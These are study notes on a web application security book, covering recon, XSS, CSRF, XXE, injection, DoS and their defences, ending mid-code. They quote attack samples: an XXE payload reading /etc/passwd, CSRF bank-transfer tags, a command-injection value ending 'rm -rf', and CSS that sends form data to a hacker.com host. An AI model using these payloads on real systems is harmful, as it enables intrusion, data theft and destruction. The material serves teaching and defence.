Web Application Security=Andrw Hoffman;Note=Erxin


# Preface 
- Vulnerabilities considered in depth 

cross-site scripting (XSS)



# Recon
- information gathering 
- web application mapping 
- applications you intend to test frequently and over long periods of time


# The structure of a modern web application 
- modern web application 
REST API 
JSON or XML 
JavaScript 
SPA framework (React, Vue, EmberJS, AngularJS)
An authentication and authorization system 
One or more web servers(typically on linux)
One or more web server software(ExpressJS, Apache, Nginx)
One or more databases(MySql, MongoDB, etc)
A local data store on client(cookie, web storage, indexdb)

- rest API 

must be separate from the client 

must be stateless 

must be easily cacheable 

each endpoint should define a specific object or method 

/moderators/joe/logs/xx_xx...

GET, POST, PUT and DELETE 

put for update a existing element 
post for add a new element 

- the OAuth protocol is great for websites that want to integrate with larger websites. 

- A subset of local storage called session storage operates identically


# Finding subdomains 
- multiple subdomain 
                    test.my.megabank.com
                    my.megabank.com
www.megabank.com <- megabank.com -> mail.megabank.com 

- view webrequests 

browser’s network tools, or a more powerful tool like Burp, PortSwigger, or ZAP.

- results come from the XHR tab, under the Network tab, which will show you any HTTP POST, GET, PUT, DELETE

- check the data for performing penetration tests 

past includes:

Cached copies of GitHub repos that were accidentally turned public before being turned private again

SSH keys

Various keys for services like Amazon AWS or Stripe that were exposed periodically and then removed from a public-facing web application

DNS listings and URLs that were not intended for a public audience

Pages detailing unreleased products that were not intended to be live

Financial records hosted on the web but not intended to be crawled by a search engine

Email addresses, phone numbers, and usernames

- information many places, such as:

Search engines

Social media posts

Archiving applications, like archive.org

Image searches and reverse image searches

- check search engine cache 

site:mega-bank.com log in

- add specific negative conditions to any query string. For example, -inurl:<pattern> will reject any URLs that match the pattern supplied.

- Archive.org strives to preserve the history of the internet

- Zone Transfer Attacks

Walking through a public-facing web app and analyzing network requests will only get you so far

works against improperly configured Domain Name System (DNS) servers. It’s not really a “hack,” although though its name would imply it is.

    + we need to pretend we are a DNS server and request a DNS zone file as if we needed it in order to update our own records. We need to first find the DNS servers associated with https://www.mega-bank.com. 
    
    in unix 
    
    $ host -t mega-bank.com 
    mega-bank.com name server ns1.bankhost.com
    mega-bank.com name server ns2.bankhost.com

    host refers to a DNS lookup utility that you can find in most Linux distros as well as in recent versions of macOS. The -t flag specifies we want to request the nameservers that are responsible for resolving mega-bank.com

    make a zone transfer request 
    $ host -l mega-bank.com ns1.bankhost.com

    wish to get a zone transfer file for mega-bank.com from ns1.bankhost.com in order to update our records.
    If the request is successful, indicating an improperly secured DNS server, you would see a result like 
    ```
    Using domain server:
    Name: ns1.bankhost.com
    Address: 195.11.100.25
    Aliases:

    mega-bank.com has address 195.250.100.195
    mega-bank.com name server ns1.bankhost.com
    mega-bank.com name server ns2.bankhost.com
    mail.mega-bank.com has address 82.31.105.140
    admin.mega-bank.com has address 32.45.105.144
    internal.mega-bank.com has address 25.44.105.144
    ```
    
- brute forcing subdomains 

fire off a request to <subdomain-guess>.mega-bank.com. If we receive a response, we mark it as a live subdomain.

a list of potential subdomains

takes advantage of the DNS library provided within Node.js

```
const dns = require('dns');
const promises = [];

/*
 * This list can be filled with the previous brute force
 * script, or use a dictionary of common subdomains.
 */
const subdomains = [];

/*
 * Iterate through each subdomain, and perform an asynchronous
 * DNS query against each subdomain.
 *
 * This is much more performant than the more common `dns.lookup()`
 * because `dns.lookup()` appears asynchronous from the JavaScript,
 * but relies on the operating system's getaddrinfo(3) which is
 * implemented synchronously.
 */
subdomains.forEach((subdomain) => {
  promises.push(new Promise((resolve, reject) => {
    dns.resolve(`${subdomain}.mega-bank.com`, function (err, ip) {
      return resolve({ subdomain: subdomain, ip: ip });
    });
  }));
});

// after all of the DNS queries have completed, log the results
Promise.all(promises).then(function(results) {
  results.forEach((result) => {
    if (!!result.ip) {
      console.log(result);
    }
  });
});
```

- dictionary attacks 

A popular open source DNS scanner called dnscan ships with a list of the most popular subdomains on the internet

dnscan repository on GitHub hosts files containing the top 10,000 subdomains that can be integrated into your recon process

```
const dns = require('dns');
const csv = require('csv-parser');
const fs = require('fs');

const promises = [];

/*
 * Begin streaming the subdomain data from disk (versus
 * pulling it all into memory at once, in case it is a large file).
 *
 * On each line, call `dns.resolve` to query the subdomain and
 * check if it exists. Store these promises in the `promises` array.
 *
 * When all lines have been read, and all promises have been resolved,
 * then log the subdomains found to the console.
 *
 * Performance Upgrade: if the subdomains list is exceptionally large,
 * then a second file should be opened and the results should be
 * streamed to that file whenever a promise resolves.
 */
fs.createReadStream('subdomains-10000.txt')
  .pipe(csv())
  .on('data', (subdomain) => {
    promises.push(new Promise((resolve, reject) => {
      dns.resolve(`${subdomain}.mega-bank.com`, function (err, ip) {
        return resolve({ subdomain: subdomain, ip: ip });
      });
    }));
  })
  .on('end', () => {

   // after all of the DNS queries have completed, log the results
   Promise.all(promises).then(function(results) {
     results.forEach((result) => {
       if (!!result.ip) {
         console.log(result);
       }
     });
   });
  });
```


# API Analysis 
- endpoint discovery，APIs follow a REST format or a SOAP format. REST

GET api.mega-bank.com/users/1234
GET api.mega-bank.com/users/1234/payments
POST api.mega-bank.com/users/1234/payments

- REST http verb 

POST    Create
GET     Read
PUT     Update/Replace
PATCH   Update/Modify
DELETE  Delete

special method that only exists to give information about a particular API’s verbs. This method is called OPTIONS

automatic test API entry points with http verbs 

- many modern applications send authentication tokens with every request. This means if we can reverse engineer the type of authentication used and understand how the token is being attached to requests, it will be easier to analyze 

    + HTTP basic 
    username and pasword sent on each request
    
    strengths, all major browsers support this natively 
    
    session does not expire, easy to intercept 
    
        * example 
        
        ```
        GET /homepage
        HOST mega-bank.com
        Authorization: Basic am9lOjEyMzQ=
        Content Type: application/json
        ```
        
        Basic authorization header being sent. Furthermore, the string am9lOjEyMzQ= is simply a base64-encoded username:password
        
        basic authentication is typically only used on web applications that enforce SSL/TLS traffic encryption. This way, credentials cannot be intercepted midair
        
        we should try is attaching an authorization header and check the return 
    
    + HTTP Digest authentication 
    
    hashed username:realm:password sent on reach request 
    
    more difficult to intercept; server can reject expired tokens 
    
    encryption strength dependent on hashing algorithm used 
    
    + OAuth, "Bearer" token-based auth; allows sign in with other websites such as Amazon -> Twitch 
    
    Tokenized permissions can be shared from one app to another from intergrations 
    
    Phishing risk; central site can be compromised, compromising all connected apps 
    
    
- common shapes, OAuth 2.0 flow may expect the following data

{
  "response_type": code,
  "client_id": id,
  "scope": [scopes],
  "state": state,
  "redirect_uri": uri
}
    
OAuth 2.0 endpoint should be structured as follows
    
https://discordapp.com/api/oauth2/authorize?response_type=code&client_\
id=157730590492196864&scope=identify%20guilds.\
join&state=15773059ghq9183habn&redirect_uri=https%3A%2F%2Fnicememe.\
website&prompt=consent
    
    + facebook auth 2 
GET https://graph.facebook.com/v4.0/oauth/access_token?
   client_id={app-id}
   &redirect_uri={redirect-uri}
   &client_secret={app-secret}
   &code={code-parameter}
    
  
  
# Identifying third party dependencies 
- ReDoS, Prototype Pollution, and XSS vulnerabilities on the web
    
largest SPA frameworks 

EmberJS, LinkedIn, Netflix 

AngularJS, Google 

React, Facebook 

VueJS, Adobe, Githab 
    
- detecting javascript libraries 
    
```
const getScripts = function() {

  /*
   * A query selector can either start with a "."
   * if referencing a CSS class, a "#" if referencing
   * an `id` attribute, or with no prefix if referencing an HTML element.
   *
   * In this case, 'script' will find all instances of <script>.
   */
  const scripts = document.querySelectorAll('script');

  /*
   * Iterate through each `<script>` element, and check if the element
   * contains a source (src) attribute that is not empty.
   */
  scripts.forEach((script) => {
    if (script.src) {
       console.log(`i: ${script.src}`);
    }
  });
};
```
    
- detecting global css libraries 
    
```
const getStyles = function() {
  const scripts = document.querySelectorAll('link');

  /*
   * Iterate through each script, and confirm that the `link`
   * element contains a `rel` attribute with the value `stylesheet`.
   *
   * Link is a multipurpose element most commonly used for loading CSS
   * stylesheets, but also used for preloading, icons, or search.
   */
  scripts.forEach((link) => {
    if (link.rel === 'stylesheet') {
       console.log(`i: ${link.getAttribute('href')}`);
    }
  });
};
```
    
- detecting server-side frameworks. all of the code require for the client is downloaded and stored in memory referenced via DOM 
    
    + x header detection 
    X-Powered-By: ASP.NET
    
    Server: Microsoft-IIS/4.5
    X-AspNet-Version: 4.0.25
    
    + default error message and 404 pages 
    
    Ruby on Rails is one of the largest open source web application frameworks, and its source code is hosted on GitHub for easier collaboration.
    
    HTML powering this page can be found at the public GitHub repository for Ruby on Rails under the file location rails/railties/lib/rails/generators/rails/app/templates/public/404.html
    
    determine that the version of Ruby on Rails being tested is somewhere between version 3.2.16 and 4.2.8. It just so happens that Ruby on Rails version 3.2.x until 4.2.7 was subject to a XSS vulnerability
    
    + database detection 
    
    Most databases support the notion of a “primary key,” which refers to a key in a table (SQL) or document (NoSQL) 
    
    MongoDB, a popular NoSQL database. By default, MongoDB generates a field called _id for each document created. The _id key is generated using a low-collision hashing algorithm
    
    find a primary key in the form of a request like:

    GET users/:id
    
    

# Identifying weak points in application architecture 
- well organized set of notes for each application 

technology used in the web application 

list of API endpoints by HTTP verb 

list of API endpoint shapes 

functionality included in the web application 

domains used by the web application 

configurations found 

authentication/session management systems 

- writes user-provided HTML directly to the DOM is definitely a risk and may allow a user to upload a script (if proper sanitization is not present) and execute that script on another user’s machine (XSS).
    
loaded into the DOM and evaluated as DOM test message<script>alert('hacked');</script>

instant messaging system 

UI to write a message 

API endpoint to receive a message just written and submitted 

a database table to store a message 

an API endpoint to retrieve one or more messages 

UI code to display one or more messages 

- avoid XSS risk 

import { DOMPurify } from '../utils/DOMPurify';

// makes use of: https://github.com/cure53/DOMPurify
const appendToDOM = function(data, selector, unsafe = false) {
  const element = document.querySelector(selector);

  // for cases where DOM injection is required (not default)
  if (unsafe) {
   element.innerHTML = DOMPurify.sanitize(data);
  } else { // standard cases (default)
   element.innerText = data;
  }
};

- multiple layers of security, XSS risk could occur. The layers were:

API POST

Database Write

Database Read

API GET

Client Read

    + such as XXE or CSRF—each vulnerability can occur as a result of insufficient security mechanisms at more than one layer

- SHA-3 from a source like OpenJDK and still gain all of the benefits that come from NIST and community testing.

- a securely architected application will only reinvent features that are purely functional, such as reinventing a schema for storing comments, or a notification system.

- A good web application developer understands this and will focus their energy on developing where their expertise lies, and request assistance when operating outside of their primary domain.


# Offense 
- earn about attacks that stem from insecure API endpoints,

- hacker's mindset 

identify third-party dependencies (often OSS) in an application



# Cross-site scripting (XSS)
- XXS categorized a number of ways 

stored, code is stored on a database prior to execution 

reflected, the code is not stored in a database, but reflected by a server 

DOM-based, code is both stored and executed in the browser

- Open Web Application Security Project (OWASP) 

- discover XXS vulnerabilities

UI for submitting support requests does not support bolding text. support wrapped with html tag 

as a stored XSS attack—a variation of XSS that relies on the actual attack code being stored in the application owner’s databases.

    + run a script in the browser that was not written by the web application owner 
    
    can run behind the scenes, without any visibility or required user input to start 
    
    can obtain any type of data present in the current web application 
    
    can freely send and receive data from a malicious web server 
    
    occur as result of improperly santized user input being embedded in the UI 
    
    can be used to steal session tokens, leading to account takeover 
    
    can be used to draw DOM objects over current UI, leading to perfect phishing attacks that cannot be identified by a nontechnical user 
    
- stored XSS

- Reflected XSS attacks, on the other hand, operate identically to stored XSS attacks but are not stored in a database, nor should they regularly hit a server.

shares the malicious link on the web waiting for user to click 

include a script tag in the query params: support.mega-bank.com/search?query=open+<script>alert(test);</script>checking+account.

Opening up this URL loads the search results, but initially pops up an alert modal with the word “test” inside.

- DOM based XSS

DOM is rebuilt using DOMParser.parseFromString()

DOM XSS, and they can be found in all major browsers via window.location.search.

- mutation-based XSS, dubbed mutation-based XSS (mXSS).

mXSS attacks are possible against all major browsers today. They rely on developing a deep understanding of methods by which the browser performs optimizations

<noscript><p title="</noscript><img src=x onerror=alert(1)>">

browser DOM performed some optimizations causing it to look like this:

```
<noscript><p title="</noscript>
<img src="x" onerror="alert(1)">
"">
"
```

when it passed sanitization and moved to a real browser environment the <p title=" was ignored and the img onerror became valid.

Mutation-based XSS is extremely new, and often misunderstood in the application security industry.


# Cross site request forgery (CSRF)
- CSRF attacks take advantage of the way browsers operate and the trust relationship between a website and the browser. 

- query parameter tampering 

HTTP GET requests. The most common of which is simply an <a href="https://my-site.com"></a> embedded in an HTML snippet

GET /resource-url?key=value HTTP/1.1
Host: www.mega-bank.com

treat user click the like and send the http get request to server with current user's auth cookie 

- CSRF attack are:

Privilege escalation

The user account that initiates the request typically does not know it occurred (it is a stealthy attack)

- CSRF attacks involving HTTP GET param tampering usually proceed

web server uses HTTP GET params to modify its flow of logic

crafts a URL string with those params: <a href="https://www.mega-bank.com/transfer?to_user=<hacker’s account>&amount=10000">click me</a>

a distribution strategy: usually either targeted (who has the highest chance of being logged in and having the correct amount of funds?) or bulk (how can I hit as many people with this in a short period of time before it is detected?).

    + example 
//Videos typically load into the DOM immediately, depending on the browser's
configuration
<img src="https://www.mega-bank.com/transfer?
to_user=<hacker's account>&amount=10000" width="0" height="0" border="0">

<video width="1280" height="720" controls>
  <source src="https://www.mega-bank.com/transfer?
  to_user=<hacker's account>&amount=10000" type="video/mp4">
</video>

- possible to deliver a CSRF payload that targets a POST, PUT, or DELETE endpoint

<form action="https://www.mega-bank.com/transfer" method="POST">
  <input type="hidden" name="to_user" value="hacker">
  <input type="hidden" name="amount" value="10000">
  <input type="submit" value="Submit">
</form>

use of the “hidden” type attribute on form inputs in order to seed data that will not be rendered inside of the browser

if a user who is on the internal network fills out and submits the form, the request will be made 


# XML External Entity (XXE)
- This classification of attack relies on an improperly configured XML parser

XML-like formats include SVG, HTML/DOM, PDF (XFDF), and RTF. These XML-like formats share many common similarities with the XML spec

XXE is often used to compromise files from other users, or to access files like /etc/shadow that store important credentials required for a Unix-based server to function properly

- direct XXE, n XML object is sent to the server with an external entity flag. It is then parsed, and a result is returned that includes the external entity

user -send xml payload-> server -parse xml entity flag-send back result-> user

```
import utilAPI from './utilAPI';

/*
 * Generate a new XML HTTP request targeting the XML -> JPG utility API.
 */
const xhr = new XMLHttpRequest();
xhr.open('POST', utilAPI.url + '/screenshot');
xhr.setRequestHeader('Content-Type', 'application/xml');

/*
 * Provide a manually crafted XML string that makes use of the external
 * entity functionality in many XML parsers.
 */
const rawXMLString = `<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><xxe>&xxe;</xxe>`;

xhr.onreadystatechange = function() {
   if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
       // check response data here
   }
}

/*
 * Send the request to the XML -> JPG utility API endpoint.
 */
xhr.send(rawXMLString);
```

- indirect XXE, the server generates an XML object. The XML object includes params provided by the user, potentially leading to the inclusion of an external entity tag

modern JSON/REST APIs will in fact interface at some point or another with an XML/SOAP API. 

XXE attacks against XML parsers are easy to fix. Sometimes just a single configuration line can remove the ability to reference external entities.


# Injection 
- SQL injection. An SQL string is escaped in an HTTP payload, leading to custom SQL queries being executed on behalf of the end user

- user_id string, many more objects could be returned from the database.

const user_id = '1=1'

- code injection, SQL injection is first an injection attack and second a code injection attack. 

As a result of the apostrophe (') to break the options string, we now run into a much more dangerous form of injection that results

- command injection, execute commands (typically Bash) against a Unix-based OS (Macintosh or Linux) has very serious risks attached to it. 

// name to be sent in POST request
const name = 'myVideo.mp4 && rm -rf /videos/converted/';


# Denial of service 
- the distributed denial of service (DDoS) attack. This attack is a form of denial of service (DoS)

to code-level DoS that affects a single user as a result of a faulty regex implementation, resulting in long times to validate a string of text.

- regular expressions can be specifically crafted to run slowly. These are called malicious regexes

most malicious regex are formed using the plus “+” operator

    + example
    
/^((ab)*)+$/

outwards, ababababababab, will also run quite fast. If we modify this pattern to abababababababa with an extra “a”, suddenly the regex will evaluate slowly

(abababababababa) is not valid.

(ababababababa)(ba) is not valid.

(abababababa)(baba) is not valid.

Many iterations later: (ab)(ab)(ab)(ab)(ab)(ab)(ab)(a) is not valid.

- logical dos vulnerabilities, Logical DoS vulnerabilities are some of the hardest to find and exploit

any operation can confirm operates synchronous 

database writes 

drive write 

sql joins 

file backups 

looping logical operations 

    + example For example, a photo-sharing application could expose an API route that permits a user to upload a photo.

- distributed DoS 

Most botnet-based DDoS attacks will make requests directly against a server’s IP address, and not against any specific API endpoint. These requests usually are UDP traffic in an attempt to drown out the server’s available bandwidth


# Exploiting third-party dependencies 
- open source contributions by a large number of developers. software of today is built on top of OSS

Reddit (BackBoneJS, Bootstrap)

Twitch (Webpack, Nginx)

YouTube (Polymer)

LinkedIn (EmberJS)

Microsoft Office Web (AngularJS)

Amazon DocumentDB (MongoDB)

- relying on OSS means you are relying on a codebase that probably has not been audited to the same stringent lengths 

- self hosted application 

Some OSS applications come prepackaged, often with simple setup installers. A prime example of this is WordPress

- Every major programming language has at least one package manager

Simply integrating your OSS npm package into a commercial application could be an attack vector capable

    + example 
    
in 2018, a similar attack occurred with event-stream, which had added a dependency of flatmap-stream. flatmap-stream included some malicious code to steal the Bitcoin wallets of the computer

In 2018, the credentials of the owner of eslint-scope were compromised by a hacker who published a new version of eslint-scope that would steal local credentials on any machine it was installed on

- other languages, nuget, conan, spack etc. 

- common vulnerabilities and exposures database 

Mitre’s Common Vulnerabilities and Exposures (CVE) database. https://cve.mitre.org/

US Department of Commerce National Vulnerability Database (NVD)

these CVE databases can provide you with detailed methods of exploiting an application that contains a previously disclosed vulnerability. 


# Defense

# Securing modern web appliations 
- comprehensive code reivews 

    + most security-conscious companies use a combination of the following
    bug bounty programs 
    
    internal red/blue teams 
    
    third-party penetration testers 
    
    corporate incentives for engineers to log known vulnerabilities 
    
- regression testing 
- mitigation strategies 

Mitigation comes in the form of secure coding best practices, secure application architecture, regression testing frameworks, secure software development life cycle (SSDL), and secure-by-default developer mindset and development frameworks.


# Secure application architecture 
- consider risks 

how do we handle data in transit 

how do we handle storage of credentials 

how do we handle various authorization levels of users 

- secure sockets layer and transport layer security 

The HTTP specification offers “HTTPS” or “HTTP Secure,” a URI-scheme that requires TLS/SSL to be present before allowing any data to be sent over the network.

- secure credentials with hash 

    + case 1 
    passwroed stored in plain text 
    all passwords compromised 
    
    + case 2 
    passwords hashed with md5 
    
    hacker can crask some of the passwords using rainbow tables, a precomputed table of hash 
    
    + case 3 
    passwords hashed with BCrypt
    
    unlikely be cracked 
    
- BCrypt is a hashing function that derives its name from two developments: the “B” comes from Blowfish Cipher, a symmetric-key block cipher developed in 1993 by Bruce Schneier

- PBKDF2 As an alternative to BCrypt, the PBKDF2 hashing algorithm can also be used to secure passwords. PBKDF2 is based on a concept known as key stretching

- 2FA to our users who want to ensure their account integrity is not compromised

Google Authenticator, one of the most common 2FA applications for Android and iOS. It is compatible with many websites and has an open API for integrating into your application

2FA systems require a user to enter a password into their browser, in addition to entering a password generated from a mobile application or SMS text message. More advanced 2FA protocols actually make use of a physical hardware token, usually a USB drive that generates a unique one-time-use token when plugged into a user’s computer.

- PII and financial data, When we store personally identifiable information (PII) on a user, we need to ensure that such storage is legal in the countries we are operating in,



# Reviewing code for security 
- It makes sense to perform code security reviews at merging

- review flow 

git checkout master 

git pull origin master 

git checkout <username>/feature 

git diff origin/master 

- a monolithic application that couples client and server code must consider security mechanisms against many languages



# Vulnerability discovery 
- static analysis

    + tools 

    Checkmarx (most major languages—paid)

    PMD (Java—free)

    Bandit (Python—free)

    Brakeman (Ruby—free)

- dynamic analysis

sensitive data improperly stored in memory or side-channel attacks.

    + tools 


    IBM AppScan (paid)

    Veracode (paid)

    Iroh (free)
    
    +  Jest, a fast, clean, and powerful testing library for JavaScript applications. Jest can be easily modified to test for security regressions

UI component vulnerability demo 
```
const currentUser = require('../currentUser');
const modifySubscription = require('../../modifySubscription');

const tiers = ['individual', 'business', 'corporation'];

/*
 * Takes an HTTP GET on behalf of the currently authenticated user.
 *
 * Takes a param `newTier` and attempts to update the authenticated
 * user's subscription to that tier.
 */
app.get('/changeSubscriptionTier', function(req, res) {
 if (!currentUser.isAuthenticated) { return res.sendStatus(401); }
 if (!req.params.newTier) { return res.sendStatus(400); }
 if (!tiers.includes(req.params.newTier)) { return res.sendStatus(400); }

 modifySubscription(currentUser, req.params.newTier)
 .then(() => {
   return res.sendStatus(200);
 })
 .catch(() => {
   return res.sendStatus(400);
 });
});
```

relative vulnerability test 
```
const tester = require('tester');
const requester = require('requester');

/*
 * Checks the HTTP Options of the `changeSubscriptionTier` endpoint.
 *
 * Fails if more than one verb is accepted, or the verb is not equal
 * to 'POST'.
 * Fails on timeout or unsuccessful options request.
 */
const testTierChange = function() {
 requester.options('http://app.com/api/changeSubscriptionTier')
  .on('response', function(res) {
   if (!res.headers) {
    return tester.fail();
   } else {
     const verbs = res.headers['Allow'].split(',');
     if (verbs.length > 1) { return tester.fail(); }
     if (verbs[0] !== 'POST') { return tester.fail(); }
   }
  })
  .on('error', function(err) {
    console.error(err);
    return tester.fail();
  })
};
```

- a well-defined and publicized way of disclosing vulnerabilities in your application.

    the CSRF bug was that the endpoint should only accept HTTP POST requests. 
- vulnerability regression testing 

- common OWASP top 10 vulnerabilties 
https://owasp.org/www-project-top-ten

- static analysis can detect 

Gneral XSS, look for DOM manipulation with innerHTML 

Reflected XSS, look for variables pulled from a URL param 

DOM XSS, look for specific DOM sinks like setInterval() 

SQL injection, look for user-provided strings being used in queries 

CSRF, look for state changing GET request 

DoS, look for improperly written regular expression 

- Static analysis tooling is not effective at finding advanced vulnerabilities involving deep application knowledge, chaining of vulnerabilities

- bug bounty programs, HackerOne is one of the most popular bug bounty platforms on the web and helps small companies set up bug bounty programs

- third-party pentration testing, Bug bounty hunters are (mostly, minus the top 1%) freelance penetration testers. 

life cycle (SSDL)



# Vulnerability management 
- ranking vulnerabilities severity 

    + comono vulnerability scoring system, The Common Vulnerability Scoring System (CVSS) is a freely published system

    a general-purpose vulnerability scoring system for common (OWASP top 10) vulnerabilities
    
    + breaks down vulnerability into a few important subsections 
    
    base, socring the vulnerability itself 
    
    temporal, scoring the severity of a vulnerability over time 
    
    environmental, scoring a vulnerability based on the environment it exists in 
    
    + CVSS base coring 
    
    Attack Vector (AV), Attack Vector accepts Network, Adjacent, Local, and Physical options.

    Attack Complexity (AC), accepts two options, “low” or “high.” The Attack Complexity input option refers to the difficulty of exploitation

    Privileges Required (PR), describes the level of authorization a hacker needs to pull off the attack: “none” (guest user), “low,” and “high.” A “high” privilege attack could only be initiated by an admin

    User Interaction (UI), has only two potential inputs, “none” and “required.” This option details if user interaction (clicking a link) 

    Scope (S), Scope suggests the range of impact successful exploitation would have. “Unchanged” scope refers to an attack that can only affect a local system

    Confidentiality Impact (C), Confidentiality takes one of three possible inputs: “none,” “low,” and “high.” 

    Integrity Impact (I), Integrity also takes one of three possible inputs: “none”, “low,” and “high.” The “none” option refers to an attack that does not change application state

    Availability Impact (A), Availability takes one of three possible options: “none,” “low,” and “high.” It refers to the availability of the application to legitimate users

    + CVSS map to numberical scoring 


    0.1–4: Low severity

    4.1–6.9: Medium severity

    7–8.9: High severity

    9+: Critical severity
    
    + temporal score has three categories 
    exploitability, Accepts a value from “unproven” to “high.” This metric attempts to determine if a reported vulnerability is simply a theory or proof of concept
    
    remediation level, “O” for “Official Fix,” while a vulnerability with no known solution would be a “U” for “Fix Unavailable.”
    
    report confidence 
    
- environment scoring algorithm, three requirements that detail the importance of confidentiality, integrity, and availability to your application.



# Defending against XSS attacks 
- we must ensure that the user-supplied data is interpreted as text and not DOM

//unknown side effect of JSON.parse()
const isStringLike = function(x) {
  try {
     return JSON.stringify(JSON.parse(x)) === x;
  } catch (e) {
    console.log('not string-like');
  }
};

- innerText is much safer because it attempts to sanitize anything that looks like an HTML 

const userString = '<strong>hello, world!</strong>;
const div = document.querySelector('#userComment');
div.innerText = userString; // tags interpreted as strings
//div.innerHTML will interpreted as DOM

- let’s assume your sanitizer blocks single and double quotes as well as script tags. You could still run into this issue

<a href="javascript:alert(document.cookie)">click me</a>

known as the JavaScript pseduo-scheme allow script execution without any script tags 

<a href="javascript:alert(String.fromCharCode(88,83,83))">click me</a>

- Stay away from the following APIs when possible:

element.innerHTM`L / `element.outerHTML

Blob

SVG

document.write / document.writeln

DOMParser.parseFromString

document.implementation

- dom parser sink 

const parser = new DOMParser();
const html = parser.parseFromString('<script>alert("hi");</script>`);

- svg sink 

SVG carry significant risk as sinks because they store arbitrary data and yet still are capable of code execution

<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <circle cx="250" cy="250" r="50" fill="red" />
  <script type="text/javascript">console.log('test');</script>
</svg>

- Blob also carries the same risk

// create blob with script reference
const blob = new Blob([script], { type: 'text/javascript' });
const url = URL.createObjectURL(blob);

// inject script into page for execution
const script = document.createElement('script');
script.src = url;

// load the script into the page
document.body.appendChild(script);

- sanitizing hyperlinks 

<button onclick="goToLink()">click me</button>
```
const userLink = "<script>alert('hi')</script>";

const goToLink = function() {
  window.location.href = `https://mywebsite.com/${userLink}`;

  // goes to: https://my-website.com/<script>alert('hi')</script>
};
```

sanitized html
```
const userLink = "<script>alert('hi')</script>";

const goToLink = function() {
  const dummy = document.createElement('a');
  dummy.href = userLink;
  window.location.href = `https://mywebsite.com/${dummy.a}`;

  // goes to: https://my-website.com/%3Cstrong%3Etest%3C/strong
};

goToLink();

encodeURIComponent('<strong>test</strong'); // %3Cstrong%3Etest%3C%2Fstrong%3E
```

- html entity encoding 
&   & + amp;
<   & + lt;
>   & + gt;
"   & + #034;
'   & + #039;

- CSS, <image></image> tags to initiate an HTTP GET request against a malicious web server?

#income[value=">100k"] {
  background:url("https://www.hacker.com/incomes?amount=gte100k");
}

when the income button is set to >100k, the CSS background changes, initiating a GET request and leaking the form data to another website

CSS attacks can be avoided by:

[easy]

    Disallowing user-uploaded CSS
[medium]

    Allowing only specific fields to be modified by the user and generating the custom stylesheet yourself on the server using these fields
[hard]

    Sanitizing any HTTP-initiating CSS attributes (background:url)

- script source 

CSP allows you to specifically whitelist URLs from which dynamic scripts can be loaded. 

Content-Security-Policy: script-src "self" https://api.mega-bank.com.

The "self" in the CSP declaration simply refers to the current URL from which the policy is loaded

- unsafe eval and unsafe inline 

not good
```
const startCountDownTimer = function(minutes, message) {
 setTimeout(function() {
   alert(message);
 }, minutes * 60 * 1000);
};
```

a safe way 
```
const startCountDownTimer = function(minutes, message) {
 setTimeout(function() {
   alert(message);
 }, minutes * 60 * 1000);
};
```

- implementing a CSP 

CSP is easy to implement as it is simply a string configuration modifier that is read by the browser and translated into security rules

Have your server send a Content-Security-Policy header with each request. 

Embed a <meta> tag in your HTML markup.



# Defending against CSRF attacks 
- Cross-Site Request Forgery (CSRF) attacks that took advantage of a user’s authenticated session in order to make requests on their behalf. 

HTTP, there are two headers we are interested in when checking the origin of a request: referer and origin. cannot be modified programmatically with JavaScript in all major browsers

The origin header is only sent on HTTP POST requests. It is a simple header that indicates where a request originated from

The referer header is set on all requests, and also indicates where a request originated from. 

- only sent on HTTP POST requests, An origin header looks like: Origin: https://www.mega-bank.com:80

- The referer header is set on all requests, and also indicates where a request originated from

Referer: https://www.mega-bank.com:80

- a POST request is made to your web server—for example, https://www.mega-bank.com/transfer with params amount=1000 and to_user=123—you can verify that the location of these headers is the same as your trusted origins

- CSRF tokens

client makes request for web page 
|
V
server returns web page along with CSRF token 
|
V
client requests http resource on server, attaching CSRF token 
|
V 
CSRF token is validated by server and response is sent to client

This token is generated cryptographically with a very low collision algorithm, which means that the odds of getting two identical tokens are exceedingly rare

- stateless CSRF tokens CSRF token should consist of the following:

A unique identifier of the user the token belongs to

A timestamp (which can be used for expiration)

A cryptographic nonce whose key only exists on the server

- Anti-CRSF Coding Best Practices

refactoring to stateless GET requests 

implementation of application wide CSRF defense 

introduction of request-checking middleware 

- stateless GET request 

// GET
const user = function(req, res) {
 getUserById(req.query.id).then((user) => {
   if (req.query.updates) { user.update(req.updates); }
   return res.json(user);
 });
};

// POST
const updateUser = function(req, res) {
  getUserById(req.query.id).then((user) => {
   user.update(req.updates).then((updated) => {
     if (!updated) { return res.sendStatus(400); }
     return res.sendStatus(200);
   });
 });
};

- application wide CSRF mitigation 

```
const crypto = require('../util/crypto');
const dateTime = require('../util/dateTime');
const session = require('../util/session');
const logger = require('../util/logger');

const validLocations = [
 'https://www.mega-bank.com',
 'https://api.mega-bank.com',
 'https://portal.mega-bank.com'
 ];

const validateHeaders = function(headers, method) {
  const origin = headers.origin;
  const referer = headers.referer;
  let isValid = false;

  if (method === 'POST') {
    isValid = validLocations.includes(referer) && validLocations.includes(origin);
  } else {
    isValid = validLocations.includes(referer);
  }

  return isValid;
};

const validateCSRFToken = function(token, user) {
  // get data from CSRF token
  const text_token = crypto.decrypt(token);
  const user_id = text_token.split(':')[0];
  const date = text_token.split(':')[1];
  const nonce = text_token.split(':')[2];

  // check validity of data
  let validUser = false;
  let validDate = false;
  let validNonce = false;

  if (user_id === user.id) { validUser = true; }
  if (dateTime.lessThan(1, 'week', date)) { validDate = true; }
  if (crypto.validateNonce(user_id, date, nonce)) { validNonce = true; }

  return validUser && validDate && validNonce;
};

const CSRFShield = function(req, res, next) {
 if (!validateHeaders(req.headers, req.method) ||
     !validateCSRFToken(req.csrf, session.currentUser) {
     logger.log(req);
     return res.sendStatus(401);
  }

 return next();
};
```


# Defending against XXE 
- XXE is indeed easy to defend against—simply disable external entities in your XML parser (see Figure 24-1).

factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

particularly dangerous against Java-based XML parsers

always check your XML parser’s API documentation to make sure

- evaluating other data formats, change xml to JSON 

XML is probably still ideal in any case where the payload will eventually be rendered.

JSON, YAML, BSON, or EDN are all suitable alternatives but should require a similar analysis prior to commitment.



# Defending against inject 
- SQL injection 

/api
  /routes
  /utils
/analytics
  /routes
/client
  /pages
  /scripts
  /media
  
- Node.js app and contains:

    SQL Server—via NodeMSSQL adapter (npm)

    MySQL—via mysql adapter (npm)

```
const sql = require('sql');

const getUserByUsername = function(username) {
  const q = new sql();
  q.select('*');
  q.from('users');
